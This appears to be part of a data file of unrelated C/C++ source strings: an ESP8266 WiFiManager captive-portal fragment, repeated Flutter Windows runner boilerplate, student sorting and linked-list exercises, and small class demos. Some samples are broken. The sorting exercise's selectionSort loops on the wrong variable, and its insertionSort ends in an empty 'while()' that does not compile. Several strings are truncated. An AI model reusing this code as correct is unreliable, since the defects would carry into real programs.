new_params;\r\n    } else {\r\n      DEBUG_WM(F(\"ERROR: failed to realloc params, size not increased!\"));\r\n      return false;\r\n    }\r\n  }\r\n\r\n  _params[_paramsCount] = p;\r\n  _paramsCount++;\r\n  DEBUG_WM(F(\"Adding parameter\"));\r\n  DEBUG_WM(p->getID());\r\n  return true;\r\n}\r\n\r\nvoid WiFiManager::setupConfigPortal() {\r\n  dnsServer.reset(new DNSServer());\r\n  server.reset(new ESP8266WebServer(80));\r\n\r\n  DEBUG_WM(F(\"\"));\r\n  _configPortalStart = millis();\r\n\r\n  DEBUG_WM(F(\"Configuring access point... \"));\r\n  DEBUG_WM(_apName);\r\n  if (_apPassword != NULL) {\r\n    if (strlen(_apPassword) < 8 || strlen(_apPassword) > 63) {\r\n      // fail passphrase to short or long!\r\n      DEBUG_WM(F(\"Invalid AccessPoint password. Ignoring\"));\r\n      _apPassword = NULL;\r\n    }\r\n    DEBUG_WM(_apPassword);\r\n  }\r\n\r\n  //optional soft ip config\r\n  if (_ap_static_ip) {\r\n    DEBUG_WM(F(\"Custom AP IP/GW/Subnet\"));\r\n    WiFi.softAPConfig(_ap_static_ip, _ap_static_gw, _ap_static_sn);\r\n  }\r\n\r\n  if (_apPassword != NULL) {\r\n    WiFi.softAP(_apName, _apPassword);//password option\r\n  } else {\r\n    WiFi.softAP(_apName);\r\n  }\r\n\r\n  delay(500); // Without delay I've seen the IP address blank\r\n  DEBUG_WM(F(\"AP IP address: \"));\r\n  DEBUG_WM(WiFi.softAPIP());\r\n\r\n  /* Setup the DNS server redirecting all the domains to the apIP */\r\n  dnsServer->setErrorReplyCode(DNSReplyCode::NoError);\r\n  dnsServer->start(DNS_PORT, \"*\", WiFi.softAPIP());\r\n\r\n  /* Setup web pages: root, wifi config pages, SO captive portal detectors and not found. */\r\n  server->on(String(F(\"/\")), std::bind(&WiFiManager::handleRoot, this));\r\n  server->on(String(F(\"/wifi\")), std::bind(&WiFiManager::handleWifi, this, true));\r\n  \r\n server->on(String(F(\"/0wifi\")), std::bind(&WiFiManager::handleWifi, this, false));\r\n  \r\n server->on(String(F(\"/wifisave\")), std::bind(&WiFiManager::handleWifiSave, this));\r\n\r\nserver->on(String(F(\"/tokensave\")), std::bind(&WiFiManager::handleTokenSave, this));\r\n\r\n  server->on(String(F(\"/i\")), std::bind(&WiFiManager::handleToken, this));\r\n\r\nserver->on(String(F(\"/update\")), std::bind(&WiFiManager::handleUpdate, this));\r\n\r\nserver->on(String(F(\"/firmware\"))",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"project_cuoi_ki\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include<bits/stdc++.h>\nusing namespace std;\nvoid bubbleSortRight(int a[], int n){\n\tfor (int i = 1; i < n; i++){\n\t\tfor(int j = 0; j < n-i; j++){\n\t\t\tif(a[j]>a[j+1]){\n\t\t\t\tint tp = a[j];\n\t\t\t\ta[j] = a[j+1];\n\t\t\t\ta[j+1] = tp;\n\t\t\t}\n\t\t}\n\t}\n}\nvoid bubbleSortLeft(int a[], int n){\n\tfor(int i = 0; i< n-1 ;i++){\n\t\tfor(int j =  n-1; j>i; j--){\n\t\t\tif(a[j]<a[j-1]){\n\t\t\t\tint tp = a[j];\n\t\t\t\ta[j] = a[j-1];\n\t\t\t\ta[j-1] = tp;\n\t\t\t}\n\t\t}\n\t}\n}\nvoid selectionSort(int a[], int n){\n\tfor (int i = 0; i< n-1; i++){\n\t\tint m = i;\n\t\tfor(int j = i+1; i < n ;j++){\n\t\t\tif(a[j] < a[m]){\n\t\t\t\tm = j;\n\t\t\t}\n\t\t\tif(m != i){\n\t\t\t\tint tp= a[m];\n\t\t\t\ta[m] =a[i];\n\t\t\t\ta[i]=tp;\n\t\t\t}\n\t\t}\n\t}\n}\nvoid insertionSort(int a[], int n){\n\tfor (int i =0; i< n ; i++){\n\t\tint tp= a[i];\n\t\tint j = i -1;\n\t\twhile()\n\t}\n}\nint main(){\n\tint n;\n    cout << \"Nhap so phan tu mang : \"; \n    cin >> n;\n    int a[n];\n    for(int i = 0; i < n; i++) {\n        cout << \"a[\" << i << \"] = \"; \n        cin >> a[i];\n    }\n\tcout<<\"Mang chua xap sep: \";\n\tfor(int j = 0; j<n ;j++){\n\t\tcout<<a[j]<<\" \";\n\t}\n\tbubbleSortRight(a,n);\n\tcout<<\"\\n Mang xap sap theo thuat toan noi bot (Tu trai qua phai ) :\";\n\tfor(int j = 0; j<n ;j++){\n\t\tcout<<a[j]<<\" \";\n\t}\n\tbubbleSortLeft(a,n);\n\tcout<<\"\\n Mang xap sap theo thuat toan noi bot (Tu phai qua trai ) :\";\n\tfor(int j = 0; j<n ;j++){\n\t\tcout<<a[j]<<\" \";\n\t}\n\tselectionSort(a,n);\n\tcout<<\"\\n Mang xap sap theo thuat chon max :\";\n\tfor(int j = 0; j<n ;j++){\n\t\tcout<<a[j]<<\" \";\n\t}\n}\n",
    "#include <iostream>\r\nusing namespace std;\r\n\r\n/// PROGRAM SINGLE LINKED LIST NON-CIRCULAR\r\n// Deklarasi Struct Node\r\nstruct Node\r\n{\r\n    // komponen/member\r\n    int data;\r\n    string kata;\r\n    Node *next;\r\n};\r\nNode *head;\r\nNode *tail;\r\n\r\n// Inisialisasi Node\r\nvoid init()\r\n{\r\n    head = NULL;\r\n    tail = NULL;\r\n}\r\n\r\n// Pengecekan\r\nbool isEmpty()\r\n{\r\n    if (head == NULL)\r\n        return true;\r\n    else\r\n        return false;\r\n}\r\n\r\n// Tambah Depan\r\nvoid insertDepan(int nilai, string kata)\r\n{\r\n    // Buat Node baru\r\n    Node *baru = new Node;\r\n    baru->data = nilai;\r\n    baru->kata = kata;\r\n    baru->next = NULL;\r\n    if (isEmpty() == true)\r\n    {\r\n        head = tail = baru;\r\n        tail->next = NULL;\r\n    }\r\n    else\r\n    {\r\n        baru->next = head;\r\n        head = baru;\r\n    }\r\n}\r\n\r\n// Tambah Belakang\r\nvoid insertBelakang(int nilai, string kata)\r\n{\r\n    // Buat Node baru\r\n    Node *baru = new Node;\r\n    baru->data = nilai;\r\n    baru->kata = kata;\r\n    baru->next = NULL;\r\n    if (isEmpty() == true)\r\n    {\r\n        head = tail = baru;\r\n        tail->next = NULL;\r\n    }\r\n    else\r\n    {\r\n        tail->next = baru;\r\n        tail = baru;\r\n    }\r\n}\r\n// Hitung Jumlah List\r\nint hitungList()\r\n{\r\n    Node *hitung;\r\n    hitung = head;\r\n    int jumlah = 0;\r\n    while (hitung != NULL)\r\n    {\r\n        jumlah++;\r\n        hitung = hitung->next;\r\n    }\r\n    return jumlah;\r\n}\r\n\r\n// Tambah Tengah\r\nvoid insertTengah(int data,string kata ,int posisi)\r\n{\r\n    if (posisi < 1 || posisi > hitungList())\r\n    {\r\n        cout << \"Posisi diluar jangkauan\" << endl;\r\n    }\r\n    else if (posisi == 1)\r\n    {\r\n        cout << \"Posisi bukan posisi tengah\" << endl;\r\n    }\r\n    else\r\n    {\r\n        Node *baru, *bantu;\r\n        baru = new Node();\r\n        baru->data = data;\r\n        baru->kata = kata;\r\n        // tranversing\r\n        bantu = head;\r\n        int nomor = 1;\r\n        while (nomor < posisi - 1)\r\n        {\r\n            bantu = bantu->next;\r\n            nomor++;\r\n        }\r\n        baru->next = bantu->next;\r\n        bantu->next = baru;\r\n    }\r\n}\r\n\r\n// Hapus Depan\r\nvoid hapusDepan()\r\n{\r\n    Node *hapus;\r\n    if (isEmpty() == false)\r\n    {\r\n        if (head->next != NULL)\r\n        {\r\n            hapus = head;\r\n            head = head->next;\r\n            delete hapus;\r\n        }\r\n        else\r\n        {\r\n            head = tail = NULL;\r\n        }\r\n    }\r\n    else\r\n    {\r\n        cout << \"List kosong!\" << endl;\r\n    }\r\n}\r\n\r\n// Hapus Belakang\r\nvoid hapusBelakang()\r\n{\r\n    Node *hapus;\r\n    Node *bantu;\r\n    if (isEmpty() == false)\r\n    {\r\n        if (head != tail)\r\n        {\r\n            hapus = tail;\r\n            bantu = head;\r\n            while (bantu->next != tail)\r\n            {\r\n                bantu = bantu->next;\r\n            }\r\n            tail = bantu;\r\n            tail->next = NULL;\r\n            delete hapus;\r\n        }\r\n        else\r\n        {\r\n            head = tail = NULL;\r\n        }\r\n    }\r\n    else\r\n    {\r\n        cout << \"List kosong!\" << endl;\r\n    }\r\n}\r\n\r\n// Hapus Tengah\r\nvoid hapusTengah(int posisi)\r\n{\r\n    Node *hapus, *bantu, *bantu2;\r\n    if (posisi < 1 || posisi > hitungList())\r\n    {\r\n        cout << \"Posisi di luar jangkauan\" << endl;\r\n    }\r\n    else if (posisi == 1)\r\n    {\r\n        cout << \"Posisi bukan posisi tengah\" << endl;\r\n    }\r\n    else\r\n    {\r\n        int nomor = 1;\r\n        bantu = head;\r\n        while (nomor <= posisi)\r\n        {\r\n            if (nomor == posisi - 1)\r\n            {\r\n                bantu2 = bantu;\r\n            }\r\n            if (nomor == posisi)\r\n            {\r\n                hapus = bantu;\r\n            }\r\n            bantu = bantu->next;\r\n            nomor++;\r\n        }\r\n        bantu2->next = bantu;\r\n        delete hapus;\r\n    }\r\n}\r\n\r\n// Ubah Depan\r\nvoid ubahDepan(int data, string kata)\r\n{\r\n    if (isEmpty() == false)\r\n    {\r\n        head->data = data;\r\n        head->kata = kata;\r\n    }\r\n    else\r\n    {\r\n        cout << \"List masih kosong!\" << endl;\r\n    }\r\n}\r\n// Ubah Tengah\r\nvoid ubahTengah(int data,string kata ,int posisi)\r\n{\r\n    Node *bantu;\r\n    if (isEmpty() == false)\r\n    {\r\n        if (posisi < 1 || posisi > hitungList())\r\n        {\r\n            cout << \"Posisi di luar jangkauan\" << endl;\r\n        }\r\n        else if (posisi == 1)\r\n        {\r\n            cout << \"Posisi bukan posisi tengah\" << endl;\r\n        }\r\n        else\r\n        {\r\n            bantu = head;\r\n            int nomor = 1;\r\n            while (nomor < posisi)\r\n            {\r\n                bantu = bantu->next;\r\n                nomor++;\r\n            }\r\n            bantu->data = data;\r\n            bantu->kata = kata;\r\n        }\r\n    }\r\n    else\r\n    {\r\n        cout << \"List masih kosong!\" << endl;\r\n    }\r\n}\r\n\r\n// Ubah Belakang\r\nvoid ubahBelakang(int data, string kata)\r\n{\r\n    if (isEmpty() == false)\r\n    {\r\n        tail->data = data;\r\n        tail->kata = kata;\r\n    }\r\n    else\r\n    {\r\n        cout << \"List masih kosong!\" << endl;\r\n    }\r\n}\r\n// Hapus List\r\nvoid clearList()\r\n{\r\n    Node *bantu, *hapus;\r\n    b",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"book_tracker\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"book_tracker\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <iostream>\nusing namespace std;\nclass Movement\n{\npublic:\n    virtual void movement()\n    {\n        \n    }\n};\nclass Swim:public Movement\n{\n    void movement() override\n    {\n        cout << \"\u0411\u0443\u043b\u044c\u043a - \u0431\u0443\u043b\u044c\u043a\" << endl;\n    }\n};\nclass Teleport : public Movement\n{\n    void movement() override\n    {\n        int n = rand() % 100;\n        cout << \"\u043e\u043f\u0430 \u0438 \u044f \u0438\u0441\u0447\u0435\u0437, \u0430 \u043a\u0443\u0434\u0430 \u043d\u0435 \u0437\u043d\u0430\u044e\" << endl;\n        if (n % 2 == 0)\n        {\n            cout << \"\u041f\u0440\u043e\u0441\u0447\u0438\u0442\u0430\u043b\u0441\u044f \u043d\u043e \u0433\u0434\u0435...\" << endl;\n        }\n    }\n};\nclass Fly: public Movement\n{\n    void movement() override\n    {\n        cout << \"\u041d\u0443 \u0432\u0441\u0435, \u0431\u0431, \u044f \u043f\u043e\u043b\u0435\u0442\u0435\u043b\" << endl;\n    }\n};\nclass Lay :public Movement\n{\n    void movement() override\n    {\n        cout << \"\u0412\u0441\u0435, \u044f \u0441\u043f\u0430\u0442\u044c\" << endl;\n    }\n};\nclass Person\n{\npublic:\n    void move(Movement* move)\n    {\n        move->movement();\n    }\n};\nint main()\n{\n    setlocale(0, \"ru\");\n    srand(time(NULL));\n    Person person;\n    Swim swim;\n    person.move(&swim);\n    Fly fly;\n    person.move(&fly);\n    Teleport tp;\n    person.move(&tp);\n}\n",
    "#include \"BoardManager.h\"\n\nvoid BoardManager::PrintBoard()\n{\n    std::cout << \"-------------\\n\";\n    for (int i = 0; i < 3; i++) {\n        std::cout << \"| \";\n        for (int j = 0; j < 3; j++) {\n            std::cout << board[i][j] << \" | \";\n        }\n        std::cout << \"\\n-------------\\n\";\n    }\n}\n\nvoid BoardManager::MakeMove(std::string xo, int row, int col)\n{\n    board[row - 1][col - 1].replace(0, -1, xo);\n}\n\nbool BoardManager::CheckForWin(std::string xo, int rowMove, int colMove)\n{\n    int row = rowMove - 1;\n    int col = colMove - 1;\n    bool hasWon = false;\n\n    for (int i = 0; i < 3; i++)\n    {\n        if (board[i][0] == xo && board[i][1] == xo && board[i][2] == xo)\n        {\n            hasWon = true;\n        }\n        if (board[0][i] == xo && board[1][i] == xo && board[2][i] == xo)\n        {\n            hasWon = true;\n        }\n    }\n    if (board[0][0] == xo && board[1][1] == xo && board[2][2] == xo)\n    {\n        hasWon = true;\n    }\n    if (board[0][2] == xo && board[1][1] == xo && board[2][0] == xo)\n    {\n        hasWon = true;\n    }\n\n    return hasWon;\n}\n\nbool BoardManager::CheckValidMove(int rowMove, int colMove)\n{\n\n    return board[rowMove - 1][colMove - 1] == \" \";\n}\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"sqflite_todo\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | 